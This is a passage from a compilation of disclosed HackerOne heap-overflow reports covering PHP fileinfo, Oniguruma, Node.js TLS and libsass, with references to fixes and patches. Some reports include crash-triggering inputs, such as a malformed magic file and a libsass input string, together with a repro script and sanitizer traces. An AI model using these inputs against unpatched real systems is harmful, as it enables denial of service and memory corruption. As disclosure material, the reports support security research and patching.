Buffer overflow in mbc_to_code functions for UTF32BE, UTF32LE, UTF16BE, and UTF16LE due to incorrect length assumptions of a buffer. Provided a patch that was adapted to check the length of the buffer prior to using it.

## Impact

Memory leakage and/or corruption

---

### [Buffer over-write in finfo_open with malformed magic file.](https://hackerone.com/reports/476179)

- **Report ID:** `476179`
- **Severity:** High
- **Weakness:** Heap Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @haquaman
- **Bounty:** 1500 usd
- **Disclosed:** 2020-11-09T01:46:27.320Z
- **CVE(s):** CVE-2015-8865

**Vulnerability Information:**

https://bugs.php.net/bug.php?id=71527

This bug causes a segfault when running with environment variable USE_ZEND_ALLOC set to 0, and also when compiled with ASAN with USE_ZEND_ALLOC set and unset.

To reproduce, run the following PHP file, with the example magic file below.

$ cat magic-open.php
<?php
$finfo = finfo_open(FILEINFO_NONE, $argv[1]);
$info = finfo_file($finfo, $argv[2]);
var_dump($info);
?>

Magic file is (used without ASAN):
$ xxd -g 1 magic.crash-noasan
0000000: 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e  >>>>>>>>>>>>>>>>
0000010: 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e     >>>>>>>>>>>>>>>

$ cat magic.crash-noasan
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

Magic file is (used with ASAN):
$ xxd -g 1 magic.crash-asan
0000000: 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e  >>>>>>>>>>>>>>>>
0000010: 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e  >>>>>>>>>>>>>>>>
0000020: 71 3e 3e 3e 3e 3e 3e 3e 3e 0a 00                 q>>>>>>>>..

$ cat magic.crash-asan
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>q>>>>>>>>

Then run the program like:

./sapi/cli/php magic-open.php magic.crash /dev/null

You will get the following when NOT compiled with ASAN, and USE_ZEND_ALLOC is UNSET (no crash).

$ ./php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null

Warning: finfo_open(): Failed to load magic database at '/root/php-src/magic.crash-noasan'. in /root/php-src/magic-open.php on line 2

Warning: finfo_file() expects parameter 1 to be resource, boolean given in /root/php-src/magic-open.php on line 3
bool(false)


You will get the following when NOT compiled with ASAN, and USE_ZEND_ALLOC is set to 0 (crash).

 $ USE_ZEND_ALLOC=0 ./php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null
Segmentation fault

 $ USE_ZEND_ALLOC=0 gdb --args ./php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null                                                                      
<snip>
(gdb) r
Starting program: /root/php-src/php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null

Program received signal SIGSEGV, Segmentation fault.
_int_malloc (av=0x7ffff76ae760 <main_arena>, bytes=79) at malloc.c:3489
3489    malloc.c: No such file or directory.
(gdb) bt
#0  _int_malloc (av=0x7ffff76ae760 <main_arena>, bytes=79) at malloc.c:3489
#1  0x00007ffff73727b0 in __GI___libc_malloc (bytes=79) at malloc.c:2891
#2  0x0000000000a9fb44 in xbuf_format_converter (xbuf=xbuf@entry=0x7fffffff9d30, fmt=fmt@entry=0x1188930 "Failed to load magic database at '%s'.", 
    ap=ap@entry=0x7fffffff9e30) at /root/php-src/main/spprintf.c:245
#3  0x0000000000aa260d in vspprintf (pbuf=pbuf@entry=0x7fffffff9d90, max_len=max_len@entry=0, format=format@entry=0x1188930 "Failed to load magic database at '%s'.", 
    ap=ap@entry=0x7fffffff9e30) at /root/php-src/main/spprintf.c:821
#4  0x0000000000a88caf in php_verror (docref=0x0, params=params@entry=0x116a24a "", type=type@entry=2, 
    format=format@entry=0x1188930 "Failed to load magic database at '%s'.", args=args@entry=0x7fffffff9e30) at /root/php-src/main/main.c:786
#5  0x0000000000a8a644 in php_error_docref0 (docref=docref@entry=0x0, type=type@entry=2, format=format@entry=0x1188930 "Failed to load magic database at '%s'.")
    at /root/php-src/main/main.c:965
#6  0x00000000006e6338 in zif_finfo_open (ht=<optimized out>, return_value=0x18779b0, return_value_ptr=<optimized out>, this_ptr=0x0, return_value_used=<optimized out>)
    at /root/php-src/ext/fileinfo/fileinfo.c:348
#7  0x00000000010702a0 in zend_do_fcall_common_helper_SPEC (execute_data=<optimized out>) at /root/php-src/Zend/zend_vm_execute.h:558
#8  0x0000000000e40689 in execute_ex (execute_data=0x1844f10) at /root/php-src/Zend/zend_vm_execute.h:363
#9  0x0000000000d0409d in zend_execute_scripts (type=type@entry=8, retval=retval@entry=0x0, file_count=file_count@entry=3) at /root/php-src/Zend/zend.c:1341
#10 0x0000000000a92d42 in php_execute_script (primary_file=primary_file@entry=0x7fffffffd4a0) at /root/php-src/main/main.c:2610
#11 0x000000000107b1d1 in do_cli (argc=4, argv=0x17588a0) at /root/php-src/sapi/cli/php_cli.c:994
#12 0x00000000004212e9 in main (argc=4, argv=0x17588a0) at /root/php-src/sapi/cli/php_cli.c:1378
(gdb) x/i $rip
=> 0x7ffff736ff31 <_int_malloc+689>:    mov    %r14,0x10(%r9)
(gdb) i r
rax            0x7fffffff939f   140737488327583
rbx            0x7ffff76ae760   140737344366432
rcx            0x0      0
rdx            0x7ffff76ae788   140737344366472
rsi            0x7a0    1952
rdi            0x7ffff76ae760   140737344366432
rbp            0x60     0x60
rsp            0x7fffffff9310   0x7fffffff9310
r8             0x4      4
r9             0x0      0
r10            0x0      0
r11            0x416c20 4287520
r12            0x1878bb0        25660336
r13            0x6      6
r14            0x7ffff76ae7b8   140737344366520
r15            0x2710   10000
rip            0x7ffff736ff31   0x7ffff736ff31 <_int_malloc+689>
eflags         0x10287  [ CF PF SF IF RF ]
cs             0x33     51
ss             0x2b     43
ds             0x0      0
es             0x0      0
fs             0x0      0
gs             0x0      0


When compiled WITH ASAN, and USE_ZEND_ALLOC is unset (crash).
 $ ./php-5.6.18-asan magic-open.php magic.crash-asan /dev/null
ASAN:SIGSEGV
=================================================================
==20824== ERROR: AddressSanitizer: SEGV on unknown address 0x00000001f168 (pc 0x000000f9d7d4 sp 0x7ffc11db3770 bp 0x000000000000 T0)
AddressSanitizer can not provide additional info.
    #0 0xf9d7d3 in zend_mm_remove_from_free_list /root/php-src/Zend/zend_alloc.c:809
    #1 0xfa35f2 in _zend_mm_alloc_int /root/php-src/Zend/zend_alloc.c:2021
    #2 0xddffe7 in xbuf_format_converter /root/php-src/main/spprintf.c:794
    #3 0xde6b75 in vspprintf /root/php-src/main/spprintf.c:821
    #4 0xde6b75 in spprintf /root/php-src/main/spprintf.c:840
    #5 0xdc0d47 in php_verror /root/php-src/main/main.c:852
    #6 0xdc142a in php_error_docref0 /root/php-src/main/main.c:965
    #7 0x7fe8ca in zif_finfo_open /root/php-src/ext/fileinfo/fileinfo.c:348
    #8 0x17f7969 in zend_do_fcall_common_helper_SPEC /root/php-src/Zend/zend_vm_execute.h:558
    #9 0x139d03d in execute_ex /root/php-src/Zend/zend_vm_execute.h:363
    #10 0x11816fa in zend_execute_scripts /root/php-src/Zend/zend.c:1341
    #11 0xdcb6f1 in php_execute_script /root/php-src/main/main.c:2610
    #12 0x1806199 in do_cli /root/php-src/sapi/cli/php_cli.c:994
    #13 0x43622f in main /root/php-src/sapi/cli/php_cli.c:1378
    #14 0x7f87f6409ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)
    #15 0x4373ac in _start (/root/php-src/php-5.6.18-asan+0x4373ac)
SUMMARY: AddressSanitizer: SEGV /root/php-src/Zend/zend_alloc.c:809 zend_mm_remove_from_free_list
==20824== ABORTING
Aborted


And compiled with ASAN and USE_ZEND_ALLOC set to 0:

 $ USE_ZEND_ALLOC=0 ./php-5.6.18-asan magic-open.php magic.crash-asan /dev/null                                                                                     
=================================================================
==20849== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60340000cd04 at pc 0x8664d0 bp 0x7ffcc02d84b0 sp 0x7ffcc02d84a8
WRITE of size 4 at 0x60340000cd04 thread T0
    #0 0x8664cf in file_check_mem /root/php-src/ext/fileinfo/libmagic/funcs.c:426
    #1 0x80cd7b in parse /root/php-src/ext/fileinfo/libmagic/apprentice.c:1520
    #2 0x80cd7b in load_1 /root/php-src/ext/fileinfo/libmagic/apprentice.c:1022
    #3 0x8184aa in apprentice_load /root/php-src/ext/fileinfo/libmagic/apprentice.c:1215
    #4 0x81c6dc in apprentice_1 /root/php-src/ext/fileinfo/libmagic/apprentice.c:417
    #5 0x823594 in file_apprentice /root/php-src/ext/fileinfo/libmagic/apprentice.c:603
    #6 0x7fe571 in zif_finfo_open /root/php-src/ext/fileinfo/fileinfo.c:347
    #7 0x17f7969 in zend_do_fcall_common_helper_SPEC /root/php-src/Zend/zend_vm_execute.h:558
    #8 0x139d03d in execute_ex /root/php-src/Zend/zend_vm_execute.h:363
    #9 0x11816fa in zend_execute_scripts /root/php-src/Zend/zend.c:1341
    #10 0xdcb6f1 in php_execute_script /root/php-src/main/main.c:2610
    #11 0x1806199 in do_cli /root/php-src/sapi/cli/php_cli.c:994
    #12 0x43622f in main /root/php-src/sapi/cli/php_cli.c:1378
    #13 0x7f773df01ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)
    #14 0x4373ac in _start (/root/php-src/php-5.6.18-asan+0x4373ac)
0x60340000cd04 is located 36 bytes to the right of 480-byte region [0x60340000cb00,0x60340000cce0)
allocated by thread T0 here:
    #0 0x7f773e9df55f (/usr/lib/x86_64-linux-gnu/libasan.so.0+0x1555f)
    #1 0x8662ab in file_check_mem /root/php-src/ext/fileinfo/libmagic/funcs.c:418
SUMMARY: AddressSanitizer: heap-buffer-overflow /root/php-src/ext/fileinfo/libmagic/funcs.c:429 file_check_mem
Shadow bytes around the buggy address:
  0x0c06ffff9950: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c06ffff9960: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c06ffff9970: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c06ffff9980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c06ffff9990: 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa
=>0x0c06ffff99a0:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c06ffff99b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c06ffff99c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c06ffff99d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c06ffff99e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c06ffff99f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:     fa
  Heap righ redzone:     fb
  Freed Heap region:     fd
  Stack left redzone:    f1
  Stack mid redzone:     f2
  Stack right redzone:   f3
  Stack partial redzone: f4
  Stack after return:    f5
  Stack use after scope: f8
  Global redzone:        f9
  Global init order:     f6
  Poisoned by user:      f7
  ASan internal:         fe
==20849== ABORTING
Aborted



Right, so those are all the possible crash states, the patch to fix is simple:

diff --git a/ext/fileinfo/libmagic/funcs.c b/ext/fileinfo/libmagic/funcs.c
index bd6d3d5..aefb95d 100644
--- a/ext/fileinfo/libmagic/funcs.c
+++ b/ext/fileinfo/libmagic/funcs.c
@@ -414,7 +414,7 @@ file_check_mem(struct magic_set *ms, unsigned int level)
        size_t len;
 
        if (level >= ms->c.len) {
-               len = (ms->c.len += 20) * sizeof(*ms->c.li);
+               while (level >= ms->c.len) len = (ms->c.len += 20) * sizeof(*ms->c.li);
                ms->c.li = CAST(struct level_info *, (ms->c.li == NULL) ?
                    emalloc(len) :
                    erealloc(ms->c.li, len));


Reasoning for that patch is with these tests, level is set to either 31 (noasan test file), or 32 (asan test file), and ms->c.len is 10. Originally it added 20 to the length, then realloc'd the memory chunk, then indexed into the memory at position "level". This overflowed the memory, and a write occurred. This patch ensures that the memory length is over the size of level.

You can see this from some gdb sessions:

$ gdb -ex 'break file_check_mem' -ex run -ex bt -ex 'p ms->c.len' -ex quit --args ./php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null 
<snip>
Breakpoint 1 at 0x7235a0: file /root/php-src/ext/fileinfo/libmagic/funcs.c, line 413.
Starting program: /root/php-src/php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null

Breakpoint 1, file_check_mem (ms=ms@entry=0x1879810, level=level@entry=31) at /root/php-src/ext/fileinfo/libmagic/funcs.c:413
413     {
#0  file_check_mem (ms=ms@entry=0x1879810, level=level@entry=31) at /root/php-src/ext/fileinfo/libmagic/funcs.c:413
#1  0x00000000006f1f3a in parse (action=<optimized out>, lineno=<optimized out>, line=0x7fffffff5bd0 '>' <repeats 31 times>, me=0x7fffffff5bc0, ms=<optimized out>)
    at /root/php-src/ext/fileinfo/libmagic/apprentice.c:1520
#2  load_1 (ms=ms@entry=0x1879810, action=action@entry=0, fn=fn@entry=0x18779e0 "/root/php-src/magic.crash-noasan", errs=errs@entry=0x7fffffff7c60, 
    mset=mset@entry=0x7fffffff7c70) at /root/php-src/ext/fileinfo/libmagic/apprentice.c:1022
#3  0x00000000006f9a03 in apprentice_load (ms=ms@entry=0x1879810, fn=fn@entry=0x18779e0 "/root/php-src/magic.crash-noasan", action=action@entry=0)
    at /root/php-src/ext/fileinfo/libmagic/apprentice.c:1215
#4  0x00000000006fdfa6 in apprentice_1 (ms=0x1879810, fn=0x18779e0 "/root/php-src/magic.crash-noasan", action=0) at /root/php-src/ext/fileinfo/libmagic/apprentice.c:417
#5  0x00000000006fffae in file_apprentice (ms=0x1879810, fn=0x18779e0 "/root/php-src/magic.crash-noasan", action=0)
    at /root/php-src/ext/fileinfo/libmagic/apprentice.c:603
#6  0x0000000000725bb7 in magic_load (ms=<optimized out>, magicfile=<optimized out>) at /root/php-src/ext/fileinfo/libmagic/magic.c:267
#7  0x00000000006e61e5 in zif_finfo_open (ht=<optimized out>, return_value=0x18779b0, return_value_ptr=<optimized out>, this_ptr=0x0, return_value_used=<optimized out>)
    at /root/php-src/ext/fileinfo/fileinfo.c:347
#8  0x00000000010702a0 in zend_do_fcall_common_helper_SPEC (execute_data=<optimized out>) at /root/php-src/Zend/zend_vm_execute.h:558
#9  0x0000000000e40689 in execute_ex (execute_data=0x1844f10) at /root/php-src/Zend/zend_vm_execute.h:363
#10 0x0000000000d0409d in zend_execute_scripts (type=type@entry=8, retval=retval@entry=0x0, file_count=file_count@entry=3) at /root/php-src/Zend/zend.c:1341
#11 0x0000000000a92d42 in php_execute_script (primary_file=primary_file@entry=0x7fffffffd4a0) at /root/php-src/main/main.c:2610
#12 0x000000000107b1d1 in do_cli (argc=4, argv=0x17588a0) at /root/php-src/sapi/cli/php_cli.c:994
#13 0x00000000004212e9 in main (argc=4, argv=0x17588a0) at /root/php-src/sapi/cli/php_cli.c:1378
$1 = 10


So looking at the possible attacks, without asan, and not using zend alloc, we have a segfault in alloc, where alloc is presumably trying to determine free space from unassigned memory that we wrote to when overflowing, this causes a crash. This is backed up when we look at the stack trace of when we run with asan, and using zend_alloc, where we get a segfault in zend_mm_remove_from_free_list, which is caused by a call to ZEND_MM_CHECK_TREE with a mm_block with an invalid parent pointer.

Running with asan, and not using zend alloc, pinpoints the location of the buffer overwrite, to be in file_check_mem, where we patched.

After the patch, there are no crashes, and you get the message the same as running without asan and with zend alloc.

Thanks for taking the time to read this report, sorry it was such a long one, just wanted to get across all the different scenarios.

--

Upstream bug for libmagic was reported at http://bugs.gw.com/view.php?id=522

This was fixed with a slightly different patch from upstream libmagic and applied to PHP

## Impact

Can write arbitrary memory after the buffer, which leads to memory corruption and possibly remote code execution

---

### [Out of order TLS handshake / application data messages lead to segmentation fault](https://hackerone.com/reports/335495)

- **Report ID:** `335495`
- **Severity:** High
- **Weakness:** Heap Overflow
- **Program:** Node.js
- **Reporter:** @jzebor
- **Bounty:** - usd
- **Disclosed:** 2020-02-13T23:47:34.586Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 
IMPORTANT NOTE: I have already been working with the NodeJS core security team on this issue and have provided core files, POC and many other pieces of information. I was told by James Snell to report via Hackerone to make it official however all the relevant details on this issue have already been provided to NodeJS team. This report will be minimal since all details are already with the team which needs them.

**Description:** Sending interleaved handshake messages in the TLS handshake OR sending TLS handshake messages AFTER the handshake has completed (after finished msg) causes a segmentation fault of the NodeJS process. This is present in v9 and v10, using TLS module. The issue can be exposed with servers which use TLS in normal "server authentication" mode AND servers which require mutual authentication (client certificates).


## Steps To Reproduce:

  1. Setup TLS server with node. 
  2. Perform a normal handshake but insert a Client Key Exchange message AFTER the TLS handshake finished message.
  3. Observe segmentation fault of node process.

Stacktrace, core file and reproduction script(s) have all been provided to Anna Henningsen on the NodeJS core team.

## Impact: Denial of service, seg fault leads to the node instance inability to service additional clients.

## Supporting Material/References: All of this has already been provided to Core NodeJS security team.

  * List any additional material (e.g. screenshots, logs, references, commits, code examples, etc.).

## Impact

Segmentation fault of the process leads to denial of service.

---

### [PHP mbstring / Oniguruma multiple remote heap/stack corruptions](https://hackerone.com/reports/237915)

- **Report ID:** `237915`
- **Severity:** Critical
- **Weakness:** Heap Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @xixabangm4
- **Bounty:** 1500 usd
- **Disclosed:** 2019-10-14T04:40:04.200Z
- **CVE(s):** CVE-2017-9224, CVE-2017-9226, CVE-2017-9227, CVE-2017-9228, CVE-2017-9229

**Vulnerability Information:**

Oniguruma [1] by K. Kosako is a BSD licensed regular expression library that supports a variety of character encodings. The Ruby programming language, in version 1.9, as well as PHP's multi-byte string module (since PHP5), use Oniguruma as their regular expression engine. It is also used in products such as Atom, Take Command Console, Tera Term, TextMate, Sublime Text and SubEthaEdit.

We've identified six remote memory corruption issues in Oniguruma that affect the latest stable release v6.2.0 and the develop branch, they have received upstream patch in the latest stable version v6.3.0; PHP upstream has now included 5 of the patches (CVE-2017-9224, CVE-2017-9226, CVE-2017-9227, CVE-2017-9228, CVE-2017-9229) that are applicable to the mbstring module [2, 3]. The regular expression APIs may be exposed to regular expressions from the network, potentially allow remote exploitation or denial of service in products that use Oniguruma, such as when used in PHP5/7 and Ruby.

[1] https://github.com/kkos/oniguruma
[2] https://github.com/php/php-src/commit/20eacb787f4543604f3c657e191baf274bb943c2
[3] https://github.com/php/php-src/commit/bee52f352f00d86593bef43ed4cec4dbfd9edfcf

CVE-2017-9226: Heap Out-of-bounds Write
An issue was discovered in Oniguruma 6.2.0, as used in Oniguruma-mod in Ruby through 2.4.1 and mbstring in PHP through 7.1.5. A heap out-of-bounds write or read occurs in next_state_val() during regular expression compilation. Octal numbers larger than 0xff are not handled correctly in fetch_token() and fetch_token_in_cc(). A malformed regular expression containing an octal number in the form of '\700' would produce an invalid code point value larger than 0xff in next_state_val(), resulting in an out-of-bounds write memory corruption. Upstream issue report, fix and PHP commits as below:

https://github.com/kkos/oniguruma/issues/55
https://github.com/kkos/oniguruma/commit/f015fbdd95f76438cd86366467bb2b39870dd7c6
https://github.com/kkos/oniguruma/commit/b4bf968ad52afe14e60a2dc8a95d3555c543353a
https://github.com/php/php-src/commit/1e0c4386ab87c6f6392933450130470cbd1a2b19

CVE-2017-9224: Stack Out-of-bounds Read
An issue was discovered in Oniguruma 6.2.0, as used in Oniguruma-mod in Ruby through 2.4.1 and mbstring in PHP through 7.1.5. A stack out-of-bounds read occurs in match_at() during regular expression searching. A logical error involving order of validation and access in match_at() could result in an out-of-bounds read from a stack buffer. Upstream issue report, fix and PHP commits as below:

https://github.com/kkos/oniguruma/issues/57
https://github.com/kkos/oniguruma/commit/690313a061f7a4fa614ec5cc8368b4f2284e059b
https://github.com/php/php-src/commit/60b1829e1cd18facc696264fd830c4bbd593cfa9

CVE-2017-9227: Invalid Dereference, Denial-of-Service
An issue was discovered in Oniguruma 6.2.0, as used in Oniguruma-mod in Ruby through 2.4.1 and mbstring in PHP through 7.1.5. A stack out-of-bounds read occurs in mbc_enc_len() during regular expression searching. Invalid handling of reg->dmin in forward_search_range() could result in an invalid pointer dereference, as an out-of-bounds read from a stack buffer. Upstream issue report, fix and PHP commits as below:

https://github.com/kkos/oniguruma/issues/58
https://github.com/kkos/oniguruma/commit/9690d3ab1f9bcd2db8cbe1fe3ee4a5da606b8814
https://github.com/php/php-src/commit/6a8ae7cf8db3ec8dabfd027e01cdbcbb52654c90

CVE-2017-9228: Uninitialized Variable, Out-of-bounds Write
An issue was discovered in Oniguruma 6.2.0, as used in Oniguruma-mod in Ruby through 2.4.1 and mbstring in PHP through 7.1.5. A heap out-of-bounds write occurs in bitset_set_range() during regular expression compilation due to an uninitialized variable from an incorrect state transition. An incorrect state transition in parse_char_class() could create an execution path that leaves a critical local variable uninitialized until it's used as an index, resulting in an out-of-bounds write memory corruption. Upstream issue report, fix and PHP commits as below:

https://github.com/kkos/oniguruma/issues/60
https://github.com/kkos/oniguruma/commit/3b63d12038c8d8fc278e81c942fa9bec7c704c8b
https://github.com/php/php-src/commit/1c845d295037702d63097e2216b3c5db53f79273

CVE-2017-9229: Denial-of-Service
An issue was discovered in Oniguruma 6.2.0, as used in Oniguruma-mod in Ruby through 2.4.1 and mbstring in PHP through 7.1.5. A SIGSEGV occurs in left_adjust_char_head() during regular expression compilation. Invalid handling of reg->dmax in forward_search_range() could result in an invalid pointer dereference, normally as an immediate denial-of-service condition. Upstream issue report, fix and PHP commits as below:

https://github.com/kkos/oniguruma/issues/59
https://github.com/kkos/oniguruma/commit/b690371bbf97794b4a1d3f295d4fb9a8b05d402d
https://github.com/php/php-src/commit/5416deec665db293ae25548828791453d776a6bf

---

### [heap-buffer-overflow (read outside of buffer) in Sass::Prelexer::exactly<(char)92>(char const*) - libsass/src/lexer.hpp:92](https://hackerone.com/reports/221163)

- **Report ID:** `221163`
- **Severity:** High
- **Weakness:** Heap Overflow
- **Program:** LibSass
- **Reporter:** @geeknik
- **Bounty:** - usd
- **Disclosed:** 2019-10-05T04:25:03.769Z
- **CVE(s):** -

**Vulnerability Information:**

Built with afl-clang-fast from git source `5909ba5`.

Feeding a file that contains nothing but `'\` to sassc triggers this flaw.

```
==22006==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200000ef93 at pc 0x000000907c6a bp 0x7fff656d9430 sp 0x7fff656d9428
READ of size 1 at 0x60200000ef93 thread T0
    #0 0x907c69 in char const* Sass::Prelexer::exactly<(char)92>(char const*) /home/geeknik/libsass/src/lexer.hpp:92:7
    #1 0x907c69 in char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)92>(char const*)), &Sass::Prelexer::re_linebreak>(char const*) /home/geeknik/libsass/src/lexer.hpp:218
    #2 0x907c69 in char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)92>(char const*)), &Sass::Prelexer::re_linebreak>(char const*)), &Sass::Prelexer::escape_seq, &Sass::Prelexer::unicode_seq, &Sass::Prelexer::interpolant, &(char const* Sass::Prelexer::any_char_but<(char)39>(char const*))>(char const*) /home/geeknik/libsass/src/lexer.hpp:202
    #3 0x907c69 in char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)92>(char const*)), &Sass::Prelexer::re_linebreak>(char const*)), &Sass::Prelexer::escape_seq, &Sass::Prelexer::unicode_seq, &Sass::Prelexer::interpolant, &(char const* Sass::Prelexer::any_char_but<(char)39>(char const*))>(char const*))>(char const*) /home/geeknik/libsass/src/lexer.hpp:236
    #4 0x907c69 in char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)92>(char const*)), &Sass::Prelexer::re_linebreak>(char const*)), &Sass::Prelexer::escape_seq, &Sass::Prelexer::unicode_seq, &Sass::Prelexer::interpolant, &(char const* Sass::Prelexer::any_char_but<(char)39>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::exactly<(char)39>(char const*))>(char const*) /home/geeknik/libsass/src/lexer.hpp:218
    #5 0x907c69 in char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)39>(char const*)), &(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)92>(char const*)), &Sass::Prelexer::re_linebreak>(char const*)), &Sass::Prelexer::escape_seq, &Sass::Prelexer::unicode_seq, &Sass::Prelexer::interpolant, &(char const* Sass::Prelexer::any_char_but<(char)39>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::exactly<(char)39>(char const*))>(char const*) /home/geeknik/libsass/src/lexer.hpp:219
    #6 0x907c69 in Sass::Prelexer::single_quoted_string(char const*) /home/geeknik/libsass/src/prelexer.cpp:509
    #7 0x924494 in char const* Sass::Prelexer::alternatives<&Sass::Prelexer::single_quoted_string, &Sass::Prelexer::double_quoted_string>(char const*) /home/geeknik/libsass/src/lexer.hpp:202:19
    #8 0x924494 in Sass::Prelexer::quoted_string(char const*) /home/geeknik/libsass/src/prelexer.cpp:557
    #9 0x924494 in char const* Sass::Prelexer::alternatives<&Sass::Prelexer::quoted_string, &Sass::Prelexer::interpolant, &Sass::Prelexer::identifier, &Sass::Prelexer::variable, &Sass::Prelexer::percentage, &Sass::Prelexer::binomial, &Sass::Prelexer::dimension, &Sass::Prelexer::alnum>(char const*) /home/geeknik/libsass/src/lexer.hpp:202
    #10 0x924494 in char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::exactly<(char)42>(char const*)), &Sass::Prelexer::quoted_string, &Sass::Prelexer::interpolant, &Sass::Prelexer::identifier, &Sass::Prelexer::variable, &Sass::Prelexer::percentage, &Sass::Prelexer::binomial, &Sass::Prelexer::dimension, &Sass::Prelexer::alnum>(char const*) /home/geeknik/libsass/src/lexer.hpp:203
    #11 0x924494 in char const* Sass::Prelexer::alternatives<&Sass::Prelexer::kwd_optional, &(char const* Sass::Prelexer::exactly<(char)42>(char const*)), &Sass::Prelexer::quoted_string, &Sass::Prelexer::interpolant, &Sass::Prelexer::identifier, &Sass::Prelexer::variable, &Sass::Prelexer::percentage, &Sass::Prelexer::binomial, &Sass::Prelexer::dimension, &Sass::Prelexer::alnum>(char const*) /home/geeknik/libsass/src/lexer.hpp:203
    #12 0x922ba7 in char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::kwd_optional, &(char const* Sass::Prelexer::exactly<(char)42>(char const*)), &Sass::Prelexer::quoted_string, &Sass::Prelexer::interpolant, &Sass::Prelexer::identifier, &Sass::Prelexer::variable, &Sass::Prelexer::percentage, &Sass::Prelexer::binomial, &Sass::Prelexer::dimension, &Sass::Prelexer::alnum>(char const*))>(char const*) /home/geeknik/libsass/src/lexer.hpp:212:20
    #13 0x922ba7 in char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::kwd_optional, &(char const* Sass::Prelexer::exactly<(char)42>(char const*)), &Sass::Prelexer::quoted_string, &Sass::Prelexer::interpolant, &Sass::Prelexer::identifier, &Sass::Prelexer::variable, &Sass::Prelexer::percentage, &Sass::Prelexer::binomial, &Sass::Prelexer::dimension, &Sass::Prelexer::alnum>(char const*))>(char const*) /home/geeknik/libsass/src/lexer.hpp:219
    #14 0x922ba7 in char const* Sass::Prelexer::one_plus<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::kwd_optional, &(char const* Sass::Prelexer::exactly<(char)42>(char const*)), &Sass::Prelexer::quoted_string, &Sass::Prelexer::interpolant, &Sass::Prelexer::identifier, &Sass::Prelexer::variable, &Sass::Prelexer::percentage, &Sass::Prelexer::binomial, &Sass::Prelexer::dimension, &Sass::Prelexer::alnum>(char const*))>(char const*))>(char const*) /home/geeknik/libsass/src/lexer.hpp:244
    #15 0x922ba7 in char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::one_plus<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::kwd_optional, &(char const* Sass::Prelexer::exactly<(char)42>(char const*)), &Sass::Prelexer::quoted_string, &Sass::Prelexer::interpolant, &Sass::Prelexer::identifier, &Sass::Prelexer::variable, &Sass::Prelexer::percentage, &Sass::Prelexer::binomial, &Sass::Prelexer::dimension, &Sass::Prelexer::alnum>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*))>(char const*) /home/geeknik/libsass/src/lexer.hpp:218
